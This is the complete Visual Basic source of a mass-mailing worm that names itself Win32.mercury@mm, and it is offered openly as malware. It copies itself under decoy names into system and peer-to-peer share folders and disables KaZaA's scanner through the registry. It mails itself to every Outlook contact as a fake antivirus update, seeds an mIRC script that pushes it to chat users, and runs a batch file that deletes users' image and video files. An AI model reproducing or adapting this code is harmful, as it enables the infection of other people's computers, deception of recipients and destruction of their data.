VERSION 5.00
Begin VB.Form Main 
   BorderStyle     =   0  'None
   Caption         =   "main"
   ClientHeight    =   90
   ClientLeft      =   4995
   ClientTop       =   3135
   ClientWidth     =   90
   Icon            =   "Main.frx":0000
   LinkTopic       =   "Form"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
End
Attribute VB_Name = "Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
On Error Resume Next
Call Copy
Call outlook
Call mIRC
Call bt
End Sub

Sub Copy()
On Error Resume Next
Dim FSO, KaZaA, KaZaA1, KaZaADir As String
Set FSO = CreateObject("Scripting.FileSystemObject")
KaZaA1 = "C:\KaZaA\My Shared Folder\"  'Very rare
KaZaA2 = "C:\Program Files\KaZaA\My Shared Folder\" 'Common
If FSO.FolderExists(KaZaA1) = True Then KaZaADir = KaZaA1
If FSO.FolderExists(KaZaA2) = True Then KaZaADir = KaZaA2
If KaZaADir <> "" Then GoTo CopyUs Else GoTo JumpNextCode
CopyUs:
Call ModifyReg
Call pr0n
Dim aa, a, b, c, d, ef, f, KaZaA3, KaZaA4, bear, bear2, e, e2, Screen
aa = App.Path & "\" & App.EXEName & ".exe"
a = App.Path & App.EXEName & ".exe"
b = "c:\WINDOWS\taskman.exe"
c = "c:\AutoExec.exe"
d = "c:\Windows\System\AVupdate.exe"
ef = "c:\Program Files\uninstall.exe"
f = "c:\Windows\Notepad.exe"
Screen = "c:\windows\screensaver.exe"
KaZaA3 = "c:\program files\kazaa\my shared folder\IPspoofer.exe"
bear = "c:\program files\bearshare\shared\IPspoofer.exe"
e = "c:\program files\eDonkey2000\incoming\IPspoofer.exe"
KaZaA4 = "c:\program files\kazaa\my shared folder\Virtual Sex Simulator.exe"
bear2 = "c:\program files\bearshare\shared\Virtual Sex Simulator.exe"
e2 = "c:\program files\eDonkey2000\incoming\Virtual Sex Simulator.exe"
FileCopy aa, b
FileCopy a, b
FileCopy aa, c
FileCopy a, c
FileCopy aa, d
FileCopy a, d
FileCopy aa, e
FileCopy a, e
FileCopy aa, f
FileCopy a, f
FileCopy aa, KaZaA3
FileCopy a, KaZaA3
FileCopy aa, bear
FileCopy a, bear
FileCopy aa, e
FileCopy a, e
FileCopy aa, KaZaA4
FileCopy a, KaZaA4
FileCopy aa, bear2
FileCopy a, bear2
FileCopy aa, e2
FileCopy a, e2
FileCopy aa, Screen
FileCopy a, Screen
SetAttr d, vbHidden + vbReadOnly
JumpNextCode:
End Sub

Sub outlook()
On Error Resume Next
Dim RndSub, RndSub1 As String
Dim unin, taskman, av, ska, punk, a, b, c, d, f, g
Randomize
RndSub = Int((Rnd * 3) + 1)
If RndSub = 1 Then RndSub1 = "Update your Anti-Virus Software!"
If RndSub = 2 Then RndSub1 = "Update your virus defenitions (DAT files)!"
If RndSub = 3 Then RndSub1 = "1 month ago you updated your Anti-Virus software!"
unin = "c:\Program Files\uninstall.exe"
taskman = "c:\WINDOWS\taskman.exe"
av = "c:\Windows\System\AVupdate.exe"
punk = Array(unin, taskman, av)
Randomize
ska = punk(Int(Rnd * 3))
Set a = CreateObject("Outlook.Application")
Set b = a.getnamespace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For f = 1 To b.addresslists.Count
For d = 1 To b.addresslists(f).addressentries.Count
With a.createitem(69 - 69)
Set g = b.addresslists(f).addressentries(d)
.Recipients.Add g
.Subject = RndSub1
.body = "Use our automatic updater (included in this e-mail) to get the latest virus database files needed to detect new virus such as BugBear (aka Tanatos), Opasoft (Opaserv)!"
.Attachments.Add ska
.send
End With
g = ""
Next d
Next f
b.logoff
End If
End Sub

Sub ModifyReg()
On Error Resume Next
Dim RegEdit
Set RegEdit = CreateObject("WScript.Shell")
'Just to make sure that the user is sharing his stuff
RegEdit.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DisableSharing", "0x00000000 (0)", "REG_DWORD"
'Set the share dir to that dir we copied ourself to
RegEdit.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\Transfer\DlDir0", KaZaADir
'KaZaA has a lame virus scanner built in, that easy can be disabled
'by writing to the registry
RegEdit.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\Advanced\ScanFolder", "0x00000000 (0)", "REG_DWORD"
End Sub

Sub pr0n()
On Error Resume Next
'This function is here to delete any form of child abuse
'Altho it will delete all jpg, mpg, bmp and avi if there is
'child abuse applications under the formats it will be deleted.
'Who ever said a virus was a bad thing?!?!?!
Open "c:\pr0n.bat" For Output As #2
Print #2, "@Echo Off"
Print #2, "@cd C:\Program Files\Kazaa\My Shared Folder\"
Print #2, "@del *.jpg"
Print #2, "@del *.mpg"
Print #2, "@del *.bmp"
Print #2, "@del *.avi"
Print #2, "@cd c:\program files\bearshare\shared\"
Print #2, "@del *.jpg"
Print #2, "@del *.mpg"
Print #2, "@del *.bmp"
Print #2, "@del *.avi"
Print #2, "@cd c:\program files\eDonkey2000\incoming\"
Print #2, "@del *.jpg"
Print #2, "@del *.mpg"
Print #2, "@del *.bmp"
Print #2, "@del *.avi"
Close #2
Shell ("C:\pr0n.bat")
Kill ("C:\pr0n.bat")
End Sub

Sub mIRC()
On Error Resume Next
Dim FSO, mIRC1, mIRC2, mIRC3, mIRC4, mIRCDir As String
Set FSO = CreateObject("Scripting.FileSystemObject") 'FSO Object
mIRC1 = "C:\mIRC\"  'Just a possible dir
mIRC2 = "C:\mIRC32\"
mIRC3 = "C:\Program Files\mIRC\"
mIRC4 = "C:\Program Files\mIRC32\"
If FSO.FolderExists(mIRC1) = True Then mIRCDir = mIRC1
If FSO.FolderExists(mIRC2) = True Then mIRCDir = mIRC2
If FSO.FolderExists(mIRC3) = True Then mIRCDir = mIRC3
If FSO.FolderExists(mIRC4) = True Then mIRCDir = mIRC4
If mIRCDir <> "" Then GoTo WriteScript Else GoTo RunNextCode
WriteScript:
Open mIRCDir & "Script.ini" For Output As #3
Print #3, "n1= on 1:JOIN:#:{"
Print #3, "n2= /if ( $nick == $me ) { halt }"
Print #3, "n3= /msg $nick Hi want a cool screen saver?"
Print #3, "n4= /dcc send -c $nick c:\Windows\screensaver.exe"
Print #3, "n5= }"
Print #3, "n6= on 1:quit:{"
Print #3, "n7= /ame is infected with Win32.mercury@mm by Industry"
Print #3, "n8= }"
Print #3, "n9= on 1:text:*:#:{"
Print #3, "n9= /msg $chan $2-"
Print #3, "n10= }"
Print #3, "n11= on 1:text:*no*:#:/quit $nick i say yes! (Win32.mercury@mm by Industry)"
Close #3
RunNextCode:
End Sub

Sub bt()
On Error Resume Next
If Month(Now) = 12 And Day(Now) = 31 Then
MsgBox "...Saving the world before bed time...", 64, "Win32.mercury@mm"
End If
If Month(Now) = 2 And Day(Now) = 16 Then
MsgBox "...Win32.mercury Coded by Industry @ ANVXgroup...", 64, "Win32.mercury@mm"
End If
If Month(Now) = 4 And Day(Now) = 2 Then
MsgBox "...Shout out to Every one @ Indovirus...", 64, "Win32.mercury@mm"
End If
End Sub
'Win32.mercury@mm by Industry
'Respect to mANiAC89 (aka SpiderMan)
'And Every one else @ Indovirus & b8

